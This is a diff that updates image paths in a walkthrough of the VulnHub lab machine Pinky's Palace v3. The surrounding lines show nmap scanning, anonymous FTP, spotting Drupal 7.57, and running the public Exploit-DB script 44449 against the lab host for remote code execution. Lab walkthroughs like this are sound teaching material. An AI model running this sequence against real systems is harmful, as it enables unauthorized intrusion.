@@ -3,7 +3,7 @@
 - **Machine:** Pinky's Palace: v3
 - **Download:** https://www.vulnhub.com/entry/pinkys-palace-v3,237/
 
-![](831-1.png)
+![](images/831-1.png)
 
 ---
 
@@ -23,7 +23,7 @@
 nmap -sn 192.168.2.0/24
 ```
 
-![](831-2.png)
+![](images/831-2.png)
 
 ---
 
@@ -35,7 +35,7 @@ Perform a complete scan to identify open ports, services, operating system, and 
 nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.187
 ```
 
-![](831-3.png)
+![](images/831-3.png)
 
 ---
 
@@ -59,7 +59,7 @@ Run the HTTP enumeration NSE script against the web service.
 nmap -v -p 8000 -sT -sV -A --script=http-enum.nse 192.168.2.187
 ```
 
-![](831-4.png)
+![](images/831-4.png)
 
 ---
 
@@ -71,7 +71,7 @@ Connect to the FTP service.
 ftp 192.168.2.187
 ```
 
-![](831-5.png)
+![](images/831-5.png)
 
 List the available files.
 
@@ -85,7 +85,7 @@ Download the welcome file.
 get WELCOME
 ```
 
-![](831-6.png)
+![](images/831-6.png)
 
 Read the downloaded file.
 
@@ -93,7 +93,7 @@ Read the downloaded file.
 cat WELCOME
 ```
 
-![](831-7.png)
+![](images/831-7.png)
 
 The welcome message indicates that the web application is the primary attack surface.
 
@@ -113,7 +113,7 @@ Also inspect the changelog.
 http://192.168.2.187:8000/CHANGELOG.txt
 ```
 
-![](831-8.png)
+![](images/831-8.png)
 
 The changelog reveals that the target is running **Drupal 7.57**.
 
@@ -127,7 +127,7 @@ Search for publicly available exploits.
 searchsploit drupal 7.57
 ```
 
-![](831-9.png)
+![](images/831-9.png)
 
 A suitable exploit is available on Exploit-DB.
 
@@ -135,7 +135,7 @@ A suitable exploit is available on Exploit-DB.
 https://www.exploit-db.com/exploits/44449
 ```
 
-![](831-10.png)
+![](images/831-10.png)
 
 Download the exploit script.
 
@@ -149,7 +149,7 @@ Execute the exploit against the target.
 ruby 44449.rb 192.168.2.187:8000
 ```
 
-![](831-11.png)
+![](images/831-11.png)
 
 The exploit successfully gains remote code execution on the Drupal application.
 
